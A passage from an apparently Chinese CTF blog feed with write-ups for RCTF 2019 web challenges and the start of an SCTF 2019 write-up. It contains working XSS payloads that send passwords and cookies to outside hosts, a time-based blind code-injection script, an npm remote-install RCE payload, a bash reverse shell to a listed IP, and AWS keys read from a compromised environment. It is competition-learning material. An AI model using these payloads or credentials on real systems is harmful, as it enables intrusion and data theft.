class="string">""</span>&gt;<span class="xml"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line">&lt;<span class="regexp">/form&gt;</span></span><br><span class="line"><span class="regexp">&lt;/</span>body&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">stringToHex</span>(<span class="params">str</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">var</span> val=<span class="string">""</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; str.length; i++)&#123;</span><br><span class="line">      <span class="keyword">if</span>(val == <span class="string">""</span>)</span><br><span class="line">        val = str.charCodeAt(i).toString(<span class="number">16</span>);</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">        val += str.charCodeAt(i).toString(<span class="number">16</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> val;</span><br><span class="line">  &#125;</span><br><span class="line">setTimeout(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="built_in">document</span>.getElementsByName(<span class="string">'username'</span>)[<span class="number">0</span>].click();</span><br><span class="line">  <span class="built_in">document</span>.getElementsByClassName(<span class="string">'cip-ui-menu-item'</span>)[<span class="number">1</span>].click();</span><br><span class="line">   location.hostname=stringToHex(btoa(<span class="built_in">document</span>.getElementsByName(<span class="string">'password'</span>)[<span class="number">0</span>].value)).substr(<span class="number">0</span>,<span class="number">60</span>)+<span class="string">".bjslfd.ceye.io"</span>;</span><br><span class="line">  &#125;, <span class="number">3000</span>);</span><br><span class="line">&lt;<span class="regexp">/script&gt;</span></span><br></pre></td></tr></table></figure><p>最终成功打到flag</p><p>cmN0ZntrcEh0dHBfbTR5X2xlYWtfdXJfcHdkfQ==</p><p>rctf{kpHttp_m4y_leak_ur_pwd}</p><h2 id="0x04-rblog"><a href="#0x04-rblog" class="headerlink" title="0x04 rblog"></a>0x04 rblog</h2><p>XSS Bot is running on Windows Server 2008R2<br>Google Chrome is up to date<br>Version 74.0.3729.157 (Official Build) (64-bit)</p><p>首先查看CSP<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">content-security-policy: default-src &apos;self&apos;; object-src &apos;none&apos;</span><br></pre></td></tr></table></figure></p><p>检测一下，可以看到提到JSONP可能会带来一些问题，而且题目也提示到了这一点<br><img src="https://ae01.alicdn.com/kf/Hbb9261d122aa437090d4c2537562fedbf.png" alt></p><p>右键源码，发现rblog.js<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">https://rblog.2019.rctf.rois.io/rblog.js</span><br><span class="line"></span><br><span class="line">axios.get(&apos;/api/v2/posts&apos;).then(resp =&gt; &#123;</span><br><span class="line">let html = &apos;&apos;</span><br><span class="line">if (resp.data.status) &#123;</span><br><span class="line">for (let i of resp.data.data) &#123;</span><br><span class="line">html += `&lt;a href=&quot;$&#123;i.markdown_url&#125;&quot;&gt;$&#123;i.title&#125;&lt;/a&gt;\r\n`</span><br><span class="line">&#125;</span><br><span class="line">&#125; else &#123;</span><br><span class="line">html += `;_; $&#123;resp.message&#125;`</span><br><span class="line">&#125;</span><br><span class="line">document.body.children[0].innerHTML = html</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure></p><p>利用前面得到的jsonp tips测试一下</p><p><img src="https://ae01.alicdn.com/kf/Ha3a3e6515e6f4ec282b818dbc3b68637H.png" alt></p><p>目标明确就是测这个接口的xss，但是由于这个<code>content-type: application/json</code>进行限制，所以不会解析标签的<br><img src="https://ae01.alicdn.com/kf/Hef97f434b64f4dc793daae9ce0739e6eO.png" alt></p><p>神奇的是这里还存在v1版本的接口，看来以后要多试试。这次<code>content-type: text/html; charset=UTF-8</code>就可以解析了。</p><p><img src="https://ae01.alicdn.com/kf/Hb3b0de4b06b64245a3223f337dbafec0J.png" alt></p><p>娜美接下来就是考虑常规的，通过这个接口来用XSS打到cookie</p><p>但是发现会被转义为&lt;\/script&gt;</p><p><img src="https://ae01.alicdn.com/kf/H54bfba52636c40419cf45ad29047640cz.png" alt></p><p>所以接下里使用html编码来混淆一下paylaod</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;iframe srcdoc=<span class="xml"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">https://rblog.2019.rctf.rois.io/api/v1/posts?callback</span>=<span class="string">alert(1);console.log</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span>&gt;</span><br></pre></td></tr></table></figure><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;iframe srcdoc=&amp;#60;&amp;#115;&amp;#99;&amp;#114;&amp;#105;&amp;#112;&amp;#116;&amp;#32;&amp;#115;&amp;#114;&amp;#99;&amp;#61;&amp;#104;&amp;#116;&amp;#116;&amp;#112;&amp;#115;&amp;#58;&amp;#47;&amp;#47;&amp;#114;&amp;#98;&amp;#108;&amp;#111;&amp;#103;&amp;#46;&amp;#50;&amp;#48;&amp;#49;&amp;#57;&amp;#46;&amp;#114;&amp;#99;&amp;#116;&amp;#102;&amp;#46;&amp;#114;&amp;#111;&amp;#105;&amp;#115;&amp;#46;&amp;#105;&amp;#111;&amp;#47;&amp;#97;&amp;#112;&amp;#105;&amp;#47;&amp;#118;&amp;#49;&amp;#47;&amp;#112;&amp;#111;&amp;#115;&amp;#116;&amp;#115;&amp;#63;&amp;#99;&amp;#97;&amp;#108;&amp;#108;&amp;#98;&amp;#97;&amp;#99;&amp;#107;&amp;#61;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#49;&amp;#41;&amp;#59;&amp;#99;&amp;#111;&amp;#110;&amp;#115;&amp;#111;&amp;#108;&amp;#101;&amp;#46;&amp;#108;&amp;#111;&amp;#103;&amp;#62;&amp;#60;&amp;#47;&amp;#115;&amp;#99;&amp;#114;&amp;#105;&amp;#112;&amp;#116;&amp;#62;&gt;</span><br></pre></td></tr></table></figure><p>urlencode之后的paylaod<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://rblog.2019.rctf.rois.io/api/v1/%3Ciframe%20srcdoc%3D%26%2360%3B%26%23115%3B%26%2399%3B%26%23114%3B%26%23105%3B%26%23112%3B%26%23116%3B%26%2332%3B%26%23115%3B%26%23114%3B%26%2399%3B%26%2361%3B%26%23104%3B%26%23116%3B%26%23116%3B%26%23112%3B%26%23115%3B%26%2358%3B%26%2347%3B%26%2347%3B%26%23114%3B%26%2398%3B%26%23108%3B%26%23111%3B%26%23103%3B%26%2346%3B%26%2350%3B%26%2348%3B%26%2349%3B%26%2357%3B%26%2346%3B%26%23114%3B%26%2399%3B%26%23116%3B%26%23102%3B%26%2346%3B%26%23114%3B%26%23111%3B%26%23105%3B%26%23115%3B%26%2346%3B%26%23105%3B%26%23111%3B%26%2347%3B%26%2397%3B%26%23112%3B%26%23105%3B%26%2347%3B%26%23118%3B%26%2349%3B%26%2347%3B%26%23112%3B%26%23111%3B%26%23115%3B%26%23116%3B%26%23115%3B%26%2363%3B%26%2399%3B%26%2397%3B%26%23108%3B%26%23108%3B%26%2398%3B%26%2397%3B%26%2399%3B%26%23107%3B%26%2361%3B%26%2397%3B%26%23108%3B%26%23101%3B%26%23114%3B%26%23116%3B%26%2340%3B%26%2349%3B%26%2341%3B%26%2359%3B%26%2399%3B%26%23111%3B%26%23110%3B%26%23115%3B%26%23111%3B%26%23108%3B%26%23101%3B%26%2346%3B%26%23108%3B%26%23111%3B%26%23103%3B%26%2362%3B%26%2360%3B%26%2347%3B%26%23115%3B%26%2399%3B%26%23114%3B%26%23105%3B%26%23112%3B%26%23116%3B%26%2362%3B%3E</span><br></pre></td></tr></table></figure></p><p>成功触发弹窗</p><p><img src="https://ae01.alicdn.com/kf/H01cadf80b51f4201a04864a7daf24b30B.png" alt></p><p>但是chrome上的XSS Auditor就会进行拦截<br><img src="https://ae01.alicdn.com/kf/Hff577bdc8f114c5b83251aa34ab54a34M.png" alt></p><p>所以接下里就是对接口的fuzz，fuzz的目标如下:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://rblog.2019.rctf.rois.io/api/v1/&#123;fuzz_this_point&#125;</span><br></pre></td></tr></table></figure></p><p>最后没想到会是中文的标点，所以就利用。号去进一步混淆paylaod<br><img src="https://ae01.alicdn.com/kf/Ha6c2affd6bc64dcab4d8e6e10252aa3bz.png" alt></p><p>最终使用如下payload1打到flag</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://rblog.2019.rctf.rois.io/api/v1/%3Ciframe%20srcdoc=%E3%80%82%E3%80%82%E3%80%82%E3%80%82%E3%80%82%E3%80%82%E3%80%82%E3%80%82%E3%80%82%E3%80%82%E3%80%82%E3%80%82%E3%80%82%E3%80%82%E3%80%82%E3%80%82%E3%80%82%E3%80%82%E3%80%82%E3%80%82%E3%80%82%E3%80%82%E3%80%82%E3%80%82%E3%80%82%E3%80%82%E3%80%82%E3%80%82%E3%80%82%E3%80%82%E3%80%82%E3%80%82%E3%80%82%E3%80%82%E3%80%82%E3%80%82%E3%80%82%E3%80%82%E3%80%82%E3%80%82%E3%80%82%E3%80%82%E3%80%82%E3%80%82%E3%80%82%E3%80%82%E3%80%82%E3%80%82%E3%80%82%E3%80%82%E3%80%82%E3%80%82%E3%80%82%E3%80%82%E3%80%82%E3%80%82%E3%80%82%E3%80%82%E3%80%82%E3%80%82%E3%80%82%E3%80%82%E3%80%82%E3%80%82%E3%80%82%E3%80%82%E3%80%82%E3%80%82%E3%80%82%E3%80%82%E3%80%82%E3%80%82%E3%80%82%E3%80%82%E3%80%82%E3%80%82%E3%80%82%E3%80%82%E3%80%82%E3%80%82%E3%80%82%E3%80%82%E3%80%82%E3%80%82%E3%80%82%E3%80%82%E3%80%82%E3%80%82%E3%80%82%E3%80%82%E3%80%82%E3%80%82%E3%80%82%E3%80%82%E3%80%82%E3%80%82%E3%80%82%E3%80%82%E3%80%82%E3%80%82%E3%80%82%E3%80%82%E3%80%82%E3%80%82%E3%80%82%E3%80%82%E3%80%82%E3%80%82%E3%80%82%E3%80%82%E3%80%82%E3%80%82%E3%80%82%E3%80%82%E3%80%82%E3%80%82%E3%80%82%E3%80%82%E3%80%82%E3%80%82%E3%80%82%E3%80%82%E3%80%82%E3%80%82%E3%80%82%E3%80%82%E3%80%82%E3%80%82%E3%80%82%E3%80%82%E3%80%82%E3%80%82%E3%80%82%E3%80%82%E3%80%82%E3%80%82%E3%80%82%E3%80%82%E3%80%82%E3%80%82%E3%80%82%E3%80%82%E3%80%82%E3%80%82%E3%80%82%E3%80%82%E3%80%82%E3%80%82%E3%80%82%E3%80%82%E3%80%82%E3%80%82%E3%80%82%26%2360%3B%26%23115%3B%26%2399%3B%26%23114%3B%26%23105%3B%26%23112%3B%26%23116%3B%26%2332%3B%26%23115%3B%26%23114%3B%26%2399%3B%26%2361%3B%26%2334%3B%26%23104%3B%26%23116%3B%26%23116%3B%26%23112%3B%26%23115%3B%26%2358%3B%26%2347%3B%26%2347%3B%26%23114%3B%26%2398%3B%26%23108%3B%26%23111%3B%26%23103%3B%26%2346%3B%26%2350%3B%26%2348%3B%26%2349%3B%26%2357%3B%26%2346%3B%26%23114%3B%26%2399%3B%26%23116%3B%26%23102%3B%26%2346%3B%26%23114%3B%26%23111%3B%26%23105%3B%26%23115%3B%26%2346%3B%26%23105%3B%26%23111%3B%26%2347%3B%26%2397%3B%26%23112%3B%26%23105%3B%26%2347%3B%26%23118%3B%26%2349%3B%26%2347%3B%26%23112%3B%26%23111%3B%26%23115%3B%26%23116%3B%26%23115%3B%26%2363%3B%26%2399%3B%26%2397%3B%26%23108%3B%26%23108%3B%26%2398%3B%26%2397%3B%26%2399%3B%26%23107%3B%26%2361%3B%26%23112%3B%26%2397%3B%26%23114%3B%26%23101%3B%26%23110%3B%26%23116%3B%26%2346%3B%26%23108%3B%26%23111%3B%26%2399%3B%26%2397%3B%26%23116%3B%26%23105%3B%26%23111%3B%26%23110%3B%26%2346%3B%26%23104%3B%26%23114%3B%26%23101%3B%26%23102%3B%26%2361%3B%26%2339%3B%26%23104%3B%26%23116%3B%26%23116%3B%26%23112%3B%26%2358%3B%26%2347%3B%26%2347%3B%26%2352%3B%26%2355%3B%26%2346%3B%26%2357%3B%26%2348%3B%26%2346%3B%26%2350%3B%26%2348%3B%26%2352%3B%26%2346%3B%26%2350%3B%26%2356%3B%26%2358%3B%26%2350%3B%26%2350%3B%26%2351%3B%26%2351%3B%26%2347%3B%26%2339%3B%26%2343%3B%26%23100%3B%26%23111%3B%26%2399%3B%26%23117%3B%26%23109%3B%26%23101%3B%26%23110%3B%26%23116%3B%26%2346%3B%26%2399%3B%26%23111%3B%26%23111%3B%26%23107%3B%26%23105%3B%26%23101%3B%26%2359%3B%26%2334%3B%26%2362%3B%26%2360%3B%26%2347%3B%26%23115%3B%26%2399%3B%26%23114%3B%26%23105%3B%26%23112%3B%26%23116%3B%26%2362%3B%3E</span><br></pre></td></tr></table></figure><p><img src="https://ae01.alicdn.com/kf/H1a25876edb844b8081fc3430928bc5c6V.png" alt></p><h2 id="0x05-ez4cr"><a href="#0x05-ez4cr" class="headerlink" title="0x05 ez4cr"></a>0x05 ez4cr</h2><p>从源代码中看到一个<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">https:<span class="comment">//report-rblog.2019.rctf.rois.io/report.js</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> $ = <span class="built_in">document</span>.querySelector.bind(<span class="built_in">document</span>);</span><br><span class="line">$(<span class="string">'button'</span>).onclick = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">let</span> flag = <span class="keyword">new</span> URLSearchParams();</span><br><span class="line">  flag.append(<span class="string">'g-recaptcha-response'</span>, $(<span class="string">'.g-recaptcha-response'</span>).value);</span><br><span class="line">  flag.append(<span class="string">'url'</span>, $(<span class="string">'input[id=url]'</span>).value);</span><br><span class="line">  axios.post(<span class="string">'/report.php'</span>, flag).then(<span class="function"><span class="params">resp</span>=&gt;</span>&#123;</span><br><span class="line">    alert(resp.data.status)</span><br><span class="line">  &#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>从中找到一个接口<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://report-rblog.2019.rctf.rois.io/report.php</span><br></pre></td></tr></table></figure></p><p>看到请求的响应中<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">content-type</span><br><span class="line">text/html; charset=UTF-8</span><br></pre></td></tr></table></figure></p><p>所以使用jsonp的方式继续继续进行测试<br><img src="https://ae01.alicdn.com/kf/H820fa7801acc450fad77ec7b1c502c8bz.png" alt><br>发现如下测试有效</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://report-rblog.2019.rctf.rois.io/report.php?callback=%3Cscript%3E</span><br></pre></td></tr></table></figure><p><img src="RCTF.resources/DE01678E-8BB0-4881-A468-2A7132E5E1C2.png" alt="313affe25cd9c468e57b62c7d0f16684"></p><p>因此构造一个payload类似上题的paylaod在firefox成功弹窗<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://report-rblog.2019.rctf.rois.io/report.php?callback=%3Cscript%20src=https://report-rblog.2019.rctf.rois.io/report.php?callback=alert(1);console.log%3E%3C/script%3E</span><br></pre></td></tr></table></figure></p><p><img src="https://ae01.alicdn.com/kf/H3b05fb7cd8a04898a4ed4442f7409f8fu.png" alt><br>但是chrome依旧会被Xss Auditor拦截</p><p>所以需要对payload进行处理，使用fuzz进行处理，最后发现在CDN的助攻下可以直接打到<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://report-rblog.2019.rctf.rois.io/report.php?callback=%3Cscript%20src=http://report-rblog.2019.rctf.rois.io/report.php?callback=alert(1);console.log%3E%3C/script%3E</span><br></pre></td></tr></table></figure></p><p><img src="https://ae01.alicdn.com/kf/H1b322663f39748aa973afb7a2ea05593s.png" alt></p><p>以上是非预期解，原因是payload在经过Cloudflare CDN处理之后对协议进行了upgrade从而导致bypass chrome xss audit</p><p><img src="https://ae01.alicdn.com/kf/H2bc5a26629934cc88479df384ac1a406L.png" alt></p><h2 id="0x06-calcalcalc"><a href="#0x06-calcalcalc" class="headerlink" title="0x06 calcalcalc"></a>0x06 calcalcalc</h2><p>看到题目计算器后端三种计算结果比较，了解到是拟态手段，那么就只能从时间差上下手。三种计算，将由最后一个决定结果是什么。</p><ol><li>bypass 字符长度限制</li></ol><p>利用Nestjs + expressjs支持json的特性来传payload并将isVip设为true而不是’true’</p><ol start="2"><li>时间盲注脚本</li></ol><p>使用的payload<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">__import__(&apos;time&apos;).sleep(3) if ord(open(&apos;/flag&apos;).read()[3]) &gt; 67 else</span><br></pre></td></tr></table></figure></p><p>因为字符限制，所以我们混淆一下<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eval(chr(95)+chr(95)+chr(105)+chr(109)+chr(112)+chr(111)+chr(114)+chr(116)+chr(95)+chr(95)+chr(40)+chr(39)+chr(116)+chr(105)+chr(109)+chr(101)+chr(39)+chr(41)+chr(46)+chr(115)+chr(108)+chr(101)+chr(101)+chr(112)+chr(40)+chr(51)+chr(41)+chr(32)+chr(105)+chr(102)+chr(32)+chr(111)+chr(114)+chr(100)+chr(40)+chr(111)+chr(112)+chr(101)+chr(110)+chr(40)+chr(39)+chr(47)+chr(102)+chr(108)+chr(97)+chr(103)+chr(39)+chr(41)+chr(46)+chr(114)+chr(101)+chr(97)+chr(100)+chr(40)+chr(41)+chr(91)+chr(51)+chr(93)+chr(41)+chr(32)+chr(62)+chr(32)+chr(54)+chr(55)+chr(32)+chr(101)+chr(108)+chr(115)+chr(101)+chr(32)+chr(78)+chr(111)+chr(110)+chr(101))</span><br></pre></td></tr></table></figure></p><p>之后使用脚本自动化去处理，脚本中的主要坑点是在处理json上，卡了好久。之后requests库原来可以自己计算延时时间，不需要time库了。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> requests <span class="keyword">import</span> Session</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encode_cmd</span><span class="params">(cmd)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">'eval(chr('</span> + <span class="string">')+chr('</span>.join(str(ord(c)) <span class="keyword">for</span> c <span class="keyword">in</span> cmd) + <span class="string">'))'</span></span><br><span class="line"></span><br><span class="line">url = <span class="string">'http://47.90.204.28:8082/calculate'</span></span><br><span class="line">sess = Session()</span><br><span class="line">sess.headers = &#123;<span class="string">'Content-Type'</span>: <span class="string">'application/json'</span>&#125;</span><br><span class="line">calc_modal = &#123;<span class="string">'expression'</span>: <span class="string">'1+1'</span>, <span class="string">'isVip'</span>: <span class="literal">True</span>&#125;</span><br><span class="line"><span class="comment"># print(json.dumps(calc_modal))  # json.dumps之后True就变true了</span></span><br><span class="line"><span class="comment"># print(sess.post(url, data=json.dumps(calc_modal)).elapsed.total_seconds())  # &lt;2s</span></span><br><span class="line">flag = <span class="string">''</span></span><br><span class="line">i = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    low, high = <span class="number">0</span>, <span class="number">255</span></span><br><span class="line">    <span class="keyword">while</span> low &lt;= high:</span><br><span class="line">        mid = (low + high) // <span class="number">2</span></span><br><span class="line">        <span class="comment"># print(hex(mid)[2:].zfill(2),end='\r')</span></span><br><span class="line">        cmd = <span class="string">f"__import__('time').sleep(5) if ord(open('/flag').read()[<span class="subst">&#123;i&#125;</span>]) == <span class="subst">&#123;mid&#125;</span> else None"</span></span><br><span class="line">        cmd_encoded = encode_cmd(cmd)</span><br><span class="line">        calc_modal[<span class="string">'expression'</span>] = cmd_encoded</span><br><span class="line">        elapsed = sess.post(url, data=json.dumps(calc_modal))</span><br><span class="line">        <span class="comment"># print(elapsed.text)</span></span><br><span class="line">        elapsed = elapsed.elapsed.total_seconds()</span><br><span class="line">        <span class="keyword">if</span> elapsed &gt; <span class="number">4.5</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        cmd = <span class="string">f"__import__('time').sleep(5) if ord(open('/flag').read()[<span class="subst">&#123;i&#125;</span>]) &gt; <span class="subst">&#123;mid&#125;</span> else None"</span></span><br><span class="line">        cmd_encoded = encode_cmd(cmd)</span><br><span class="line">        calc_modal[<span class="string">'expression'</span>] = cmd_encoded</span><br><span class="line">        elapsed = sess.post(url, data=json.dumps(calc_modal))</span><br><span class="line">        <span class="comment"># print(elapsed.text)</span></span><br><span class="line">        elapsed = elapsed.elapsed.total_seconds()</span><br><span class="line">        <span class="keyword">if</span> elapsed &gt; <span class="number">4.5</span>:</span><br><span class="line">            low = mid + <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            high = mid - <span class="number">1</span></span><br><span class="line">    print()</span><br><span class="line">    flag += chr(mid)</span><br><span class="line">    print(flag)</span><br><span class="line">    <span class="keyword">if</span> chr(mid) == <span class="string">'&#125;'</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    i += <span class="number">1</span></span><br></pre></td></tr></table></figure></p><p>参考：<br><a href="https://github.com/zsxsoft/my-ctf-challenges/blob/master/rctf2019/calcalcalc/readme.md" target="_blank" rel="noopener">https://github.com/zsxsoft/my-ctf-challenges/blob/master/rctf2019/calcalcalc/readme.md</a></p><p><a href="http://blog.leanote.com/post/xp0int/%5BWeb%5D-4" target="_blank" rel="noopener">http://blog.leanote.com/post/xp0int/%5BWeb%5D-4</a></p><p>环境：<br><a href="https://github.com/CTFTraining/rctf_2019_calcalcalc" target="_blank" rel="noopener">https://github.com/CTFTraining/rctf_2019_calcalcalc</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00 前言&quot;&gt;&lt;/a&gt;0x00 前言&lt;/h2&gt;&lt;p&gt;学到了好多&lt;/p&gt;
&lt;h2 id=&quot;0x01-nextphp&quot;&gt;&lt;a href=&quot;#0x01-nex
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>2019 sctf writeup</title>
    <link href="http://zer0yu.github.io/2019/09/14/2019-sctf-writeup/"/>
    <id>http://zer0yu.github.io/2019/09/14/2019-sctf-writeup/</id>
    <published>2019-09-14T15:40:40.000Z</published>
    <updated>2019-09-14T15:47:16.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>做题最多，但是wp最简略和不全的一次，:)</p><h2 id="0x01-easy-php"><a href="#0x01-easy-php" class="headerlink" title="0x01 easy-php"></a>0x01 easy-php</h2><p><a href="https://sctf2019.l0ca1.xyz/static/js/app.51c756bc2bea67226d9b.js" target="_blank" rel="noopener">https://sctf2019.l0ca1.xyz/static/js/app.51c756bc2bea67226d9b.js</a><br>先从源代码中看一下路由信息<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">/main</span><br><span class="line">/login</span><br><span class="line">/upload</span><br></pre></td></tr></table></figure></p><p>之后发现直接访问main路由，这个登录是可以绕过的</p><p><img src="https://i.loli.net/2019/09/14/etkgfl3LJazTqdO.png" alt="7CB4FEEA-4CF6-4392-A959-4EB9F2814F80.png"></p><p>但是有一个问题就是，如何对js进行修改，方法如下</p><p>首先在burp中设置一下<br><img src="https://i.loli.net/2019/09/14/6GLMNmSg4nZi29y.png" alt="44D07737-29D7-44DE-8F9D-8DA42A080754.png"></p><p>之后使用burp进行抓包并注意点击如下选项即可<br><img src="https://i.loli.net/2019/09/14/CtonbS9hX5ivu48.png" alt="BBD70930-9E38-45E5-8974-523460096D51.png"></p><p>之后就可以对响应包进行修改了，把对应的<code>requireLogin: !0</code>修改为<code>requireLogin: 0</code></p><p>之后访问到main界面</p><p><img src="https://i.loli.net/2019/09/14/TMz692iRFyEpmAP.png" alt="4D1E33FE-2090-4F4B-A776-94CDBCDFE3B9.png"></p><p>之后查到npm支持远程安装从而可以造成rce</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;key&quot;:&quot;abcdefghiklmn123&quot;,&quot;npm&quot;:[&quot;jquery&quot;,&quot;http://`whoami`.bjslfd.ceye.io/z3.git&quot;]&#125;</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2019/09/14/xf6DbzEMq7cjmB9.png" alt="0233E12F-2439-44DF-8113-B36A22FD7706.png"></p><p><img src="https://i.loli.net/2019/09/14/DNLXEaqwBjRlohU.png" alt="71ED3664-9834-4AA5-A705-480AE1FC5BD9.png"></p><p>之后直接反弹一个shell回来</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/47.90.204.28/2333 0&gt;&amp;1</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2019/09/14/egrsZyBTfDP81iH.png" alt="AC296199-4744-4BCA-9292-C1D9CA19CE4F.png"><br>看到aws就联想到s3的一些问题<br><img src="https://i.loli.net/2019/09/14/9o3fQkntCjFe7H5.png" alt="88C2DC65-3136-496A-88F2-87D11B085355.png"></p><p>从本地环境变量读取到<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">AWS_ACCESS_KEY_ID=ASIA5CRTL2SNLRLBSRMQ</span><br><span class="line">AWS_SECRET_ACCESS_KEY=QuqbcP2cl6uAPkSDH7qSP3bSMqHk7IwKVBTUhhn2</span><br><span class="line">AWS_REGION=ap-northeast-1</span><br><span 